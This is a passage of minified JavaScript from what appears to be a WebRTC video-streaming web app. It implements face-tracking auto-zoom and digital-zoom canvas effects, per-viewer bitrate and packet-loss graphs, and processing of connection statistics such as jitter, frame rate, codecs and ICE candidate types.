void(timers.activelyProcessingDraw=!1);if(null===wh&&session.canvasSource.width&&(wh=Math.pow(session.canvasSource.width*session.canvasSource.width/36,.5),xa=0,ya=0),session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2),lastFace.w){var w=6*(wh=.999*wh+.001*Math.pow(lastFace.w*lastFace.h,.5));w>session.canvasSource.width&&(w=session.canvasSource.width),session.canvasSource.height>session.canvasSource.width?w>session.canvasSource.height&&session.canvasSource.height>session.canvasSource.width&&(w=session.canvasSource.height):w>session.canvasSource.width&&(w=session.canvasSource.width);var h=w/session.canvasSource.width*session.canvasSource.height;xa=.998*xa+.002*(lastFace.x+lastFace.w/2),ya=.998*ya+.002*(lastFace.y+lastFace.h/2);var x=xa-w/2,y=ya-h/2;x<0&&(x=0),y<0&&(y=0),x>session.canvasSource.width-w&&(x=session.canvasSource.width-w),y>session.canvasSource.height-h&&(y=session.canvasSource.height-h),x<0&&(x=0),y<0&&(y=0)}ctx.drawImage(session.canvasSource,x,y,w,h,0,0,session.canvasSource.width,session.canvasSource.height)}catch(e){}if(!timers.timeoutDraw)try{timers.timeoutDraw=audioTimerLoop(draw,session.canvasSource.srcObject.getVideoTracks()[0].getSettings().frameRate||30)}catch(e){timers.timeoutDraw=audioTimerLoop(draw,40)}timers.activelyProcessingDraw=!1}}function fde2(){timers.activelyProcessingDraw||draw(),activeDetection||detectFace()}return null==window.FaceDetector?(session.cleanOutput||warnUser("Face Detection API not detected.\n\nYou may be able to enable it here: chrome://flags/#enable-experimental-web-platform-features"),faceDetector=!1):faceDetector=new FaceDetector,fde2(),fde2}()}}var getFacesActive=!1;async function getFaces(){if(!getFacesActive){if(getFacesActive=!0,session.grabFaceData){if(!faceDetector){if(null==window.FaceDetector)return session.cleanOutput||warnUser("Face Detection API not detected.\n\nYou may be able to enable it here: chrome://flags/#enable-experimental-web-platform-features"),session.grabFaceData=!1,faceDetector=!1,void(getFacesActive=!1);session.grabFaceData=1,faceDetector=new FaceDetector}try{var videos={};for(var UUID in session.rpcs)session.rpcs[UUID].videoElement&&await faceDetector.detect(session.rpcs[UUID].videoElement).then((faces=>{videos[session.rpcs[UUID].streamID]={},videos[session.rpcs[UUID].streamID].videoWidth=session.rpcs[UUID].videoElement.videoWidth,videos[session.rpcs[UUID].streamID].videoHeight=session.rpcs[UUID].videoElement.videoHeight,videos[session.rpcs[UUID].streamID].faces=faces})).catch((e=>{}));log(videos)}catch(e){}pokeIframeAPI("face-tracking-data",videos),setTimeout((function(){getFaces()}),200)}getFacesActive=!1}}var simpleDrawMain=!1;function simpleDraw(reinit=!1){if("8"===session.effect)if(simpleDrawMain)simpleDrawMain(reinit);else if(null!==simpleDrawMain){simpleDrawMain=null;var timers={activelyProcessingDraw:!1},ctx=session.canvasCtx;simpleDrawMain=function fde1(){try{function draw(){if(!timers.activelyProcessingDraw){if(timers.activelyProcessingDraw=!0,"8"!==session.effect)return timers.timeoutDraw&&(timers.timeoutDraw(),timers.timeoutDraw=null),void(timers.activelyProcessingDraw=!1);try{if(!session.canvasSource.width)return void(timers.activelyProcessingDraw=!1);session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2),ctx.drawImage(session.canvasSource,0,0,session.canvasSource.width,session.canvasSource.height,0,0,session.canvasSource.width,session.canvasSource.height)}catch(e){errorlog(e)}if(!timers.timeoutDraw)try{timers.timeoutDraw=audioTimerLoop(draw,session.canvasSource.srcObject.getVideoTracks()[0].getSettings().frameRate||30)}catch(e){timers.timeoutDraw=audioTimerLoop(draw,40)}timers.activelyProcessingDraw=!1}}warnlog("LOADED simpleDraw()"),session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2)}catch(e){errorlog(e),timers.activelyProcessingDraw=!1}function fde2(reinit=!1){reinit&&session.canvasSource&&session.canvasSource.srcObject&&session.canvasSource.srcObject.getVideoTracks().length&&(session.canvasSource.width=session.canvasSource.srcObject.getVideoTracks()[0].getSettings().width||1280,session.canvasSource.height=session.canvasSource.srcObject.getVideoTracks()[0].getSettings().height||720),timers.activelyProcessingDraw||draw()}return fde2(),fde2}()}}var digitalZoomMain=!1;function digitalZoom(reinit=!1){if("7"===session.effect)if(digitalZoomMain)digitalZoomMain(reinit);else if(null!==digitalZoomMain){digitalZoomMain=null;var timers={activelyProcessingDraw:!1},ctx=session.canvasCtx;digitalZoomMain=function fde1(){try{warnlog("LOADED digitalZoom()"),session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2);var xa=null,ya=null,zz=1;function draw(){if(!timers.activelyProcessingDraw){if(timers.activelyProcessingDraw=!0,"7"!==session.effect)return zz=1,xa=0,ya=0,timers.activelyProcessingDraw=!1,void(timers.timeoutDraw&&(timers.timeoutDraw(),timers.timeoutDraw=null));try{if(!session.canvasSource||!session.canvasSource.width)return void(timers.activelyProcessingDraw=!1);null===xa&&session.canvasSource.width&&(xa=0,ya=0),session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2),session.effectValue&&(zz=.9*zz+.1*session.effectValue,xa=.9*xa+.1*(session.canvasSource.width-session.canvasSource.width/zz),ya=.9*ya+.1*(session.canvasSource.height-session.canvasSource.height/zz)),ctx.drawImage(session.canvasSource,xa,ya,session.canvasSource.width-2*xa,session.canvasSource.height-2*ya,0,0,session.canvasSource.width,session.canvasSource.height)}catch(e){errorlog(e)}if(!timers.timeoutDraw)try{timers.timeoutDraw=audioTimerLoop(draw,session.canvasSource.srcObject.getVideoTracks()[0].getSettings().frameRate||30)}catch(e){timers.timeoutDraw=audioTimerLoop(draw,40)}timers.activelyProcessingDraw=!1}}}catch(e){errorlog(e),timers.activelyProcessingDraw=!1}function fde2(reinit=!1){reinit&&(session.canvasSource&&session.canvasSource.srcObject&&session.canvasSource.srcObject.getVideoTracks().length&&(session.canvasSource.width=session.canvasSource.srcObject.getVideoTracks()[0].getSettings().width||1280,session.canvasSource.height=session.canvasSource.srcObject.getVideoTracks()[0].getSettings().height||720),xa=null),timers.activelyProcessingDraw||draw()}return fde2(),fde2}()}}function getNativeOutputResolution(){var tracks=session.videoElement.srcObject.getVideoTracks();return!(!tracks.length||!tracks[0].getSettings)&&tracks[0].getSettings()}function toggleSceneStats(button){var UUID=button.dataset.UUID;1==button.value?(button.value=0,button.classList.remove("pressed"),button.ariaPressed="false",session.rpcs[UUID].allowGraphs=!1):(button.value=1,button.classList.add("pressed"),button.ariaPressed="true",session.rpcs[UUID].allowGraphs=!0),1==button.value?(getById("container_"+UUID).querySelectorAll("[data-no-scenes]").forEach((ele=>{ele.classList.remove("hidden"),ele.dataset.message&&(ele.innerHTML="Requesting data ..")})),getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-bitrate"]')&&getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-bitrate"]').classList.remove("hidden"),getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-details"]')&&getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-details"]').classList.remove("hidden"),session.sendRequest({requestStatsContinuous:!0},UUID)):(session.sendRequest({requestStatsContinuous:!1},UUID),getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-bitrate"]')&&getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-bitrate"]').classList.add("hidden"),getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-details"]')&&getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-details"]').classList.add("hidden"))}function getColor(value){return["hsl(",(120*value).toString(10),",100%,50%)"].join("")}function plotData(info,UUID,uuid){log("plot data");var container=getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-bitrate"]');if(container){var canvas=getById("container_"+UUID).querySelector('canvas[data-uid="'+uuid+'"]'),canvasNew=!1;canvas||(canvasNew=!0,(canvas=document.createElement("canvas")).height=50,canvas.width=124,canvas.className="canvasStats",canvas.history_nacks=[],canvas.history_bitrate=[],canvas.target=4e3,info.scene?canvas.title="Scene: "+info.scene+". Red/orange implies packet loss. Y-axis is marked with 2500-kbps increments.":info.label?canvas.title="Label: "+info.label+". Red/orange implies packet loss. Y-axis is marked with 2500-kbps increments":canvas.title="Red/orange implies packet loss. Y-axis is marked with 2500-kbps increments",canvas.dataset.uid=uuid,container.appendChild(canvas)),selfDestructElement(UUID,uuid);var context=canvas.getContext("2d"),bitrate=0;"video_bitrate_kbps"in info&&(bitrate=info.video_bitrate_kbps),isNaN(bitrate)&&(bitrate=0),bitrate<0&&(bitrate=0);var nacks=0;"nacks_per_second"in info&&(nacks=info.nacks_per_second),isNaN(nacks)&&(nacks=0),nacks<0&&(nacks=0);var height=context.canvas.height,width=context.canvas.width;canvas.history_nacks.push(nacks),canvas.history_bitrate.push(bitrate),canvas.history_nacks=canvas.history_nacks.slice(-125),canvas.history_bitrate=canvas.history_bitrate.slice(-125);var maxBitrate=Math.max(...canvas.history_bitrate),target=canvas.target||4e3;if(target&&maxBitrate>target){canvas.target=1.5*maxBitrate;var yScale=height/canvas.target;context.clearRect(0,0,width,height);for(var x=width-1,w=1,i=0;i<canvas.history_bitrate.length;i++){nacks=canvas.history_nacks[i],bitrate=canvas.history_bitrate[i];(val=(10-nacks)/10)>1?val=1:val<0&&(val=0);var color=getColor(val),y=height-bitrate*yScale;context.fillStyle=color,context.fillRect(x,y,w,height),context.fillStyle="#DDD5",context.fillRect(x,y-2,w,4),y-5>0&&(context.fillStyle="#FFF3",context.fillRect(x,y+2,w,1));var imageData=context.getImageData(1,0,width-1,height);context.putImageData(imageData,0,0),context.clearRect(width-1,0,1,height)}for(var tt=2500;tt<canvas.target;tt+=2500){y=parseInt(height-tt*yScale);context.fillStyle="#0555",context.fillRect(0,y,width,1)}log("finished plotting a new y-axis")}else{var val;(val=(10-nacks)/10)>1?val=1:val<0&&(val=0);color=getColor(val),x=width-1,y=height-bitrate*(yScale=height/target),w=1;if(context.fillStyle=color,context.fillRect(x,y,w,height),context.fillStyle="#DDD5",context.fillRect(x,y-2,w,4),y-5>0&&(context.fillStyle="#FFF3",context.fillRect(x,y+2,w,1)),context.fillStyle="#0555",canvasNew)for(tt=2500;tt<target;tt+=2500){y=parseInt(height-tt*yScale);context.fillRect(0,y,width,1)}else for(tt=2500;tt<target;tt+=2500){y=parseInt(height-tt*yScale);context.fillRect(x,y,1,1)}imageData=context.getImageData(1,0,width-1,height);context.putImageData(imageData,0,0),context.clearRect(width-1,0,1,height),log("finished plotting")}}else log("container not found")}function selfDestructElement(UUID,uid){getById("container_"+UUID).querySelectorAll('[data-uid="'+uid+'"]').forEach((ele=>{ele.classList.remove("greyout"),clearTimeout(ele.selfFadeout),ele.selfFadeout=setTimeout((function(ele){ele.classList.add("greyout")}),4e3,ele),clearTimeout(ele.selfDestruct),ele.selfDestruct=setTimeout((function(ele){ele.remove()}),1e4,ele)}))}function remoteStats(msg,UUID){if(isIFrame&&parent.postMessage({remoteStats:msg.remoteStats,streamID:session.rpcs[UUID].streamID,UUID:UUID},session.iframetarget),(session.rpcs[UUID].allowGraphs||session.allowGraphs)&&session.director){var size=0;for(var key in msg.remoteStats)msg.remoteStats.hasOwnProperty(key)&&size++;if(!size)return getById("container_"+UUID).querySelectorAll("[data-no-scenes]").forEach((ele=>{ele.classList.remove("hidden"),ele.dataset.message&&(ele.innerHTML="No scenes active")})),void log("zero size");for(var uuid in getById("container_"+UUID).querySelectorAll("[data-no-scenes]").forEach((ele=>{ele.classList.add("hidden")})),msg.remoteStats){var span,container=getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-details-container"][data-uid="'+uuid+'"]');if(container||((container=getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-details-container"]').cloneNode(!0)).dataset.uid=uuid,container.classList.remove("hidden"),getById("container_"+UUID).querySelector('[data-action-type="stats-graphs-details"]').appendChild(container)),plotData(msg.remoteStats[uuid],UUID,uuid),"video_bitrate_kbps"in msg.remoteStats[uuid]&&"video_bitrate_kbps"!==msg.remoteStats[uuid].video_bitrate_kbps)(span=container.querySelector("[data-bitrate]"))&&(span.classList.remove("hidden"),span.innerHTML="video bitrate: "+parseInt(msg.remoteStats[uuid].video_bitrate_kbps)+" (kbps)");if((span=container.querySelector("[data-scene-name]"))&&"label"in msg.remoteStats[uuid]&&msg.remoteStats[uuid].label?(span.classList.remove("hidden"),span.innerHTML="stats for viewer: "+msg.remoteStats[uuid].label):span&&"scene"in msg.remoteStats[uuid]&&!1!==msg.remoteStats[uuid].scene?(span.classList.remove("hidden"),span.innerHTML="stats for scene: "+msg.remoteStats[uuid].scene):"meshcast"===uuid?(span.classList.remove("hidden"),span.innerHTML="stats for meshcast ingest",span.title="You can use &label=xxxx to give your view links a unique label"):(span.classList.remove("hidden"),span.innerHTML="stats for some viewer",span.title="You can use &label=xxxx to give your view links a unique label"),"resolution"in msg.remoteStats[uuid])(span=container.querySelector("[data-resolution]"))&&(span.classList.remove("hidden"),span.innerHTML=msg.remoteStats[uuid].resolution);if("video_encoder"in msg.remoteStats[uuid])(span=container.querySelector("[data-video-codec]"))&&(span.classList.remove("hidden"),span.innerHTML="video codec: "+msg.remoteStats[uuid].video_encoder)}}}function processStats(UUID){if(session.rpcs&&UUID in session.rpcs){try{if(session.rpcs[UUID].videoElement.paused&&session.firstPlayTriggered){if("suspended"==session.audioCtx.state)try{session.audioCtx.resume()}catch(e){warnlog(e)}"running"==session.audioCtx.state&&(log("trying to play"),session.rpcs[UUID].videoElement.play().then((_=>{log("playing 8")})).catch(warnlog))}}catch(e){}try{if(session.rpcs[UUID].realUUID&&session.rpcs[session.rpcs[UUID].realUUID])var node=session.rpcs[session.rpcs[UUID].realUUID];else node=session.rpcs[UUID];var validTrackIds=[];session.rpcs[UUID].streamSrc&&session.rpcs[UUID].streamSrc.getTracks().forEach((trk=>{validTrackIds.push(trk.id)})),session.rpcs[UUID].whep&&(processMeshcastStats(UUID),node.getStats||(clearTimeout(session.rpcs[UUID].getStatsTimeout),session.rpcs[UUID].getStatsTimeout=setTimeout(processStats,session.statsInterval,UUID))),node.getStats&&node.getStats().then((function(stats){if(UUID in session.rpcs){clearTimeout(session.rpcs[UUID].getStatsTimeout),session.rpcs[UUID].getStatsTimeout=setTimeout(processStats,session.statsInterval,UUID),session.rpcs[UUID].stats["Peer-to-Peer_Connection"]||(session.rpcs[UUID].stats["Peer-to-Peer_Connection"]={});var nominatedCandidate=!1,candidates={},ipleakingAllowedRemote=!1,ipleakingAllowedLocal=!1;if(stats.forEach((stat=>{try{if(stat.id&&stat.id.startsWith("DEPRECATED_"))return;var trackID=stat.trackIdentifier||stat.id||!1;if("track"==stat.type&&stat.remoteSource){if(stat.trackIdentifier&&!validTrackIds.includes(stat.trackIdentifier))return;if(stat.id in session.rpcs[UUID].stats)session.rpcs[UUID].stats[stat.id]._trackID=stat.trackIdentifier,session.rpcs[UUID].stats[stat.id].Jitter_Buffer_ms=parseInt(1e3*(parseFloat(stat.jitterBufferDelay)-session.rpcs[UUID].stats[stat.id]._jitter_delay)/(parseInt(stat.jitterBufferEmittedCount)-session.rpcs[UUID].stats[stat.id]._jitter_count))||0,session.rpcs[UUID].stats[stat.id]._jitter_delay=parseFloat(stat.jitterBufferDelay)||0,session.rpcs[UUID].stats[stat.id]._jitter_count=parseInt(stat.jitterBufferEmittedCount)||0,"frameWidth"in stat&&"frameHeight"in stat&&(session.rpcs[UUID].stats[stat.id].Resolution=stat.frameWidth+" x "+stat.frameHeight,session.rpcs[UUID].stats[stat.id]._frameWidth=stat.frameWidth,session.rpcs[UUID].stats[stat.id]._frameHeight=stat.frameHeight);else{var media={};media._jitter_delay=parseFloat(stat.jitterBufferDelay)||0,media._jitter_count=parseInt(stat.jitterBufferEmittedCount)||0,media.Jitter_Buffer_ms=0,media._trackID=stat.trackIdentifier,session.rpcs[UUID].stats[stat.id]=media,stat.kind&&"audio"==stat.kind?(session.rpcs[UUID].stats[stat.id].type="Audio Track",session.rpcs[UUID].stats[stat.id]._type="audio"):stat.kind&&"video"==stat.kind&&(session.rpcs[UUID].stats[stat.id].type="Video Track",session.rpcs[UUID].stats[stat.id]._type="video")}}else if("remote-candidate"==stat.type)candidates[stat.id]=stat,"relay"!=stat.candidateType&&(ipleakingAllowedRemote=!0);else if("local-candidate"==stat.type)candidates[stat.id]=stat,"relay"!=stat.candidateType&&(ipleakingAllowedLocal=!0);else if("candidate-pair"==stat.type&&stat.nominated)nominatedCandidate?nominatedCandidate.priority<stat.priority&&(nominatedCandidate=stat):nominatedCandidate=stat;else if("transport"==stat.type)"bytesReceived"in stat&&("_bytesReceived"in session.rpcs[UUID].stats["Peer-to-Peer_Connection"]&&session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._timestamp&&stat.timestamp&&(session.rpcs[UUID].stats["Peer-to-Peer_Connection"].total_recv_bitrate_kbps=parseInt(8*(stat.bytesReceived-session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._bytesReceived)/(stat.timestamp-session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._timestamp)),hideStreamLowBandwidth(session.rpcs[UUID].stats["Peer-to-Peer_Connection"].total_recv_bitrate_kbps,UUID)),session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._bytesReceived=stat.bytesReceived),"timestamp"in stat&&(session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._timestamp=stat.timestamp,session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._timestampStart?session.rpcs[UUID].stats["Peer-to-Peer_Connection"].time_active_minutes=parseInt((stat.timestamp-session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._timestampStart)/600)/100:session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._timestampStart=stat.timestamp);else if("inbound-rtp"==stat.type&&trackID){if(stat.trackIdentifier&&!validTrackIds.includes(stat.trackIdentifier))return;if(session.rpcs[UUID].stats[trackID]=session.rpcs[UUID].stats[trackID]||{},stat.trackIdentifier&&(session.rpcs[UUID].stats[trackID]._trackID=stat.trackIdentifier),"jitterBufferDelay"in stat&&(session.rpcs[UUID].stats[trackID].Jitter_Buffer_ms=parseInt(1e3*(parseFloat(stat.jitterBufferDelay)-session.rpcs[UUID].stats[trackID]._jitter_delay_2)/(parseInt(stat.jitterBufferEmittedCount)-session.rpcs[UUID].stats[trackID]._jitter_count_2))||0,session.rpcs[UUID].stats[trackID]._jitter_delay_2=parseFloat(stat.jitterBufferDelay)||0,session.rpcs[UUID].stats[trackID]._jitter_count_2=parseInt(stat.jitterBufferEmittedCount)||0),"frameWidth"in stat&&"frameHeight"in stat&&(session.rpcs[UUID].stats[trackID].Resolution=stat.frameWidth+" x "+stat.frameHeight,session.rpcs[UUID].stats[trackID]._frameWidth=stat.frameWidth,session.rpcs[UUID].stats[trackID]._frameHeight=stat.frameHeight),session.rpcs[UUID].stats[trackID].Bitrate_in_kbps=parseInt(8*(stat.bytesReceived-(session.rpcs[UUID].stats[trackID]._last_bytes||0))/(stat.timestamp-session.rpcs[UUID].stats[trackID]._last_time)),session.rpcs[UUID].stats[trackID]._last_bytes=stat.bytesReceived||session.rpcs[UUID].stats[trackID]._last_bytes,session.rpcs[UUID].stats[trackID]._last_time=stat.timestamp||session.rpcs[UUID].stats[trackID]._last_time,"video"==stat.mediaType){if(session.rpcs[UUID].stats._codecId=stat.codecId,session.rpcs[UUID].stats._codecIdTrackId=trackID,session.rpcs[UUID].stats[trackID].type="Video Stream",session.rpcs[UUID].stats[trackID]._type="video",session.obsfix&&"codec"in session.rpcs[UUID].stats&&"video/VP8"==session.rpcs[UUID].stats.codec?(session.rpcs[UUID].stats[trackID].pliDelta=stat.pliCount-session.rpcs[UUID].stats[trackID].keyFramesRequested_pli||0,session.rpcs[UUID].stats[trackID].nackTrigger=stat.nackCount-session.rpcs[UUID].stats[trackID].streamErrors_nackCount+session.rpcs[UUID].stats[trackID].nackTrigger||0,log("OBS PLI FIX MODE ON"),0===session.rpcs[UUID].stats[trackID].pliDelta&&session.rpcs[UUID].stats[trackID].nackTrigger>=session.obsfix?(session.requestKeyframe(UUID),session.rpcs[UUID].stats[trackID].nackTrigger=0,log("TRYING KEYFRAME")):session.rpcs[UUID].stats[trackID].pliDelta>0&&(session.rpcs[UUID].stats[trackID].nackTrigger=0)):session.obsfix&&"codec"in session.rpcs[UUID].stats&&"video/VP9"==session.rpcs[UUID].stats.codec&&(session.rpcs[UUID].stats[trackID].pliDelta=stat.pliCount-session.rpcs[UUID].stats[trackID].keyFramesRequested_pli||0,session.rpcs[UUID].stats[trackID].nackTrigger=stat.nackCount-session.rpcs[UUID].stats[trackID].streamErrors_nackCount+session.rpcs[UUID].stats[trackID].nackTrigger||0,log("OBS PLI FIX MODE ON"),0===session.rpcs[UUID].stats[trackID].pliDelta&&session.rpcs[UUID].stats[trackID].nackTrigger>=4*session.obsfix?(session.requestKeyframe(UUID),session.rpcs[UUID].stats[trackID].nackTrigger=0,log("TRYING KEYFRAME")):session.rpcs[UUID].stats[trackID].pliDelta>0&&(session.rpcs[UUID].stats[trackID].nackTrigger=0)),session.rpcs[UUID].stats[trackID].keyFramesRequested_pli=stat.pliCount||0,session.rpcs[UUID].stats[trackID].streamErrors_nackCount=stat.nackCount||0,"framesPerSecond"in stat)session.rpcs[UUID].stats[trackID].FPS=parseInt(stat.framesPerSecond);else if("framesDecoded"in stat&&stat.timestamp){var lastFramesDecoded=0,lastTimestamp=0;try{lastFramesDecoded=session.rpcs[UUID].stats[trackID]._framesDecoded,lastTimestamp=session.rpcs[UUID].stats[trackID]._timestamp}catch(e){}session.rpcs[UUID].stats[trackID].FPS=parseInt(10*(stat.framesDecoded-lastFramesDecoded)/(stat.timestamp/1e3-lastTimestamp))/10,session.rpcs[UUID].stats[trackID]._framesDecoded=stat.framesDecoded,session.rpcs[UUID].stats[trackID]._timestamp=stat.timestamp/1e3}}else"audio"==stat.mediaType&&(session.rpcs[UUID].stats._audioCodecId=stat.codecId,session.rpcs[UUID].stats._audioCodecIdTrackId=trackID,session.rpcs[UUID].stats[trackID].type="Audio Stream",session.rpcs[UUID].stats[trackID]._type="audio","audioLevel"in stat&&(session.rpcs[UUID].stats[trackID].audio_level=parseInt(1e4*parseFloat(stat.audioLevel))/1e4));if("packetsLost"in stat&&"packetsReceived"in stat){"_packetsLost"in session.rpcs[UUID].stats[trackID]||(session.rpcs[UUID].stats[trackID]._packetsLost=stat.packetsLost),"_packetsReceived"in session.rpcs[UUID].stats[trackID]||(session.rpcs[UUID].stats[trackID]._packetsReceived=stat.packetsReceived),"packetLoss_in_percentage"in session.rpcs[UUID].stats[trackID]||(session.rpcs[UUID].stats[trackID].packetLoss_in_percentage=0);let packetLoss=100*(stat.packetsLost-session.rpcs[UUID].stats[trackID]._packetsLost)/(stat.packetsReceived-session.rpcs[UUID].stats[trackID]._packetsReceived+(stat.packetsLost-session.rpcs[UUID].stats[trackID]._packetsLost))||0;session.rpcs[UUID].stats[trackID].packetLoss_in_percentage=.35*session.rpcs[UUID].stats[trackID].packetLoss_in_percentage+.65*packetLoss,session.rpcs[UUID].signalMeter&&"video"===session.rpcs[UUID].stats[trackID]._type&&(session.rpcs[UUID].stats[trackID].packetLoss_in_percentage<.01?0==session.rpcs[UUID].stats[trackID].Bitrate_in_kbps?session.rpcs[UUID].signalMeter.dataset.level=0:session.rpcs[UUID].signalMeter.dataset.level=5:session.rpcs[UUID].stats[trackID].packetLoss_in_percentage<.3?session.rpcs[UUID].signalMeter.dataset.level=4:session.rpcs[UUID].stats[trackID].packetLoss_in_percentage<1?session.rpcs[UUID].signalMeter.dataset.level=3:session.rpcs[UUID].stats[trackID].packetLoss_in_percentage<3.5?session.rpcs[UUID].signalMeter.dataset.level=2:session.rpcs[UUID].signalMeter.dataset.level=1),session.rpcs[UUID].stats[trackID]._packetsReceived=stat.packetsReceived,session.rpcs[UUID].stats[trackID]._packetsLost=stat.packetsLost}}else if("_codecId"in session.rpcs[UUID].stats&&stat.id==session.rpcs[UUID].stats._codecId)"mimeType"in stat&&(session.rpcs[UUID].stats[session.rpcs[UUID].stats._codecIdTrackId]||(session.rpcs[UUID].stats[session.rpcs[UUID].stats._codecIdTrackId]={}),session.rpcs[UUID].stats[session.rpcs[UUID].stats._codecIdTrackId].codec=stat.mimeType),"frameHeight"in stat&&"frameWidth"in stat&&(session.rpcs[UUID].stats.Resolution=parseInt(stat.frameWidth)+" x "+parseInt(stat.frameHeight));else if("_audioCodecId"in session.rpcs[UUID].stats&&stat.id==session.rpcs[UUID].stats._audioCodecId){if("mimeType"in stat){var addOnDescription=stat.mimeType;addOnDescription=addOnDescription.replace("audio/",""),"sdpFmtpLine"in stat&&stat.sdpFmtpLine.includes("useinbandfec=1")&&(addOnDescription+=", /w fec"),session.rpcs[UUID].stats[session.rpcs[UUID].stats._audioCodecIdTrackId]||(session.rpcs[UUID].stats[session.rpcs[UUID].stats._audioCodecIdTrackId]={}),session.rpcs[UUID].stats[session.rpcs[UUID].stats._audioCodecIdTrackId].codec=addOnDescription,stat.clockRate&&(session.rpcs[UUID].stats[session.rpcs[UUID].stats._audioCodecIdTrackId].clockRate=stat.clockRate,stat.channels&&(session.rpcs[UUID].stats[session.rpcs[UUID].stats._audioCodecIdTrackId].clockRate+=" / "+stat.channels))}}else Firefox&&("frameWidth"in stat&&(session.rpcs[UUID].stats.resolution=stat.frameWidth+" x "+stat.frameHeight,"framesPerSecond"in stat&&(session.rpcs[UUID].stats.resolution+=" @ "+stat.framesPerSecond)),"mimeType"in stat&&"type"in stat&&"id"in stat&&"codec"==stat.type&&(stat.mimeType.includes("video")?session.rpcs[UUID].stats.video_codec=stat.mimeType.split("video/")[1]:stat.mimeType.includes("audio")&&(session.rpcs[UUID].stats.audio_codec=stat.mimeType.split("audio/")[1],stat.clockRate?(session.rpcs[UUID].stats.audio_clockRate=stat.clockRate,stat.channels&&(session.rpcs[UUID].stats.audio_clockRate+=" / "+stat.channels)):stat.sdpFmtpLine&&(session.rpcs[UUID].stats.fmtp=stat.sdpFmtpLine))),"bytesReceived"in stat&&("kind"in stat&&"video"==stat.kind?("_bytesReceived_video"in session.rpcs[UUID].stats&&(session.rpcs[UUID].stats.videoBitrate_kbps=parseInt((stat.bytesReceived-session.rpcs[UUID].stats._bytesReceived_video)/(1024*session.statsInterval/8e3))),session.rpcs[UUID].stats._bytesReceived_video=stat.bytesReceived):"kind"in stat&&"audio"==stat.kind&&("_bytesReceived_audio"in session.rpcs[UUID].stats&&(session.rpcs[UUID].stats.audioBitrate_kbps=parseInt((stat.bytesReceived-session.rpcs[UUID].stats._bytesReceived_audio)/(1024*session.statsInterval/8e3))),session.rpcs[UUID].stats._bytesReceived_audio=stat.bytesReceived)))}catch(e){errorlog(e)}})),nominatedCandidate){if(nominatedCandidate.localCandidateId&&session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._local_ice_id&&session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._local_ice_id!==nominatedCandidate.localCandidateId&&"candidateType"in nominatedCandidate)try{delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].candidateType_local,delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_relay_IP,delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_relay_protocol}catch(e){}if(nominatedCandidate.remoteCandidateId&&session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._remote_ice_id&&session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._remote_ice_id!==nominatedCandidate.remoteCandidateId&&"candidateType"in nominatedCandidate)try{delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].candidateType_remote,delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_relay_IP,delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_relay_protocol}catch(e){}nominatedCandidate.localCandidateId&&(session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._local_ice_id=nominatedCandidate.localCandidateId),nominatedCandidate.remoteCandidateId&&(session.rpcs[UUID].stats["Peer-to-Peer_Connection"]._remote_ice_id=nominatedCandidate.remoteCandidateId),"currentRoundTripTime"in nominatedCandidate&&(session.rpcs[UUID].stats["Peer-to-Peer_Connection"].Round_Trip_Time_ms=1e3*nominatedCandidate.currentRoundTripTime)}if(nominatedCandidate&&nominatedCandidate.localCandidateId&&candidates[nominatedCandidate.localCandidateId]){if("candidateType"in(candidate=candidates[nominatedCandidate.localCandidateId]))if(session.rpcs[UUID].stats["Peer-to-Peer_Connection"].candidateType_local=candidate.candidateType,"relay"===candidate.candidateType)"relayProtocol"in candidate?session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_relay_protocol=candidate.relayProtocol:delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_relay_protocol,"ip"in candidate?session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_relay_IP=candidate.ip:delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_relay_IP,session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_ip_blocking=!ipleakingAllowedLocal;else try{delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_relay_IP,delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_relay_protocol,delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_ip_blocking}catch(e){}"networkType"in candidate&&(session.rpcs[UUID].stats["Peer-to-Peer_Connection"].local_networkType=candidate.networkType)}if(nominatedCandidate&&nominatedCandidate.remoteCandidateId&&candidates[nominatedCandidate.remoteCandidateId]){var 